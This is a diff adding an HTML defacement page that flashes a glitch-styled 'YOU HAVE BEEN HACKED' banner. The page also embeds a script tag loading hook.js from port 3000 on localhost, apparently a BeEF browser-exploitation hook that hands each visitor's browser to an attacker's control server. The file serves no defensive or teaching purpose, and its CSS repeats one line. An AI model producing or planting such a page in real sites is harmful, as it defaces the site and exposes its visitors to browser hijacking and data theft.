@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacked</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding-top: 15%;
+        }
+        .glitch {
+            font-size: 50px;
+            font-weight: bold;
+            position: relative;
+            animation: flicker 1.5s infinite alternate;
+        }
+        .glitch::before, .glitch::after {
+            content: 'YOU HAVE BEEN HACKED';
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0.8;
+        }
+        .glitch::before {
+            color: lime;
+            transform: translate(-2px, -2px);
+        }
+        .glitch::after {
+            color: blue;
+color: blue;
+            transform: translate(2px, 2px);
+        }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="glitch">YOU HAVE BEEN HACKED</div>
+        <script src="http://127.0.0.1:3000/hook.js"></script>
+</body>
+</html>
+
